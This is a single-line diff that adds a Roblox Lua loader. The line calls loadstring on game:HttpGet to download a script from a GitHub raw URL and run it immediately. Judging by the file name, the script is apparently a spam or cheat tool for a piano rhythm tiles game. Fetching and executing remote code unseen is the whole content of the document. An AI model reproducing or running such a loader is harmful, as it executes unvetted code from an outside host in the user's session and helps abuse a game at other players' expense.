@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/piano-rhythm-tiles-spam6-qggm0osmjej0dn.lua"))()
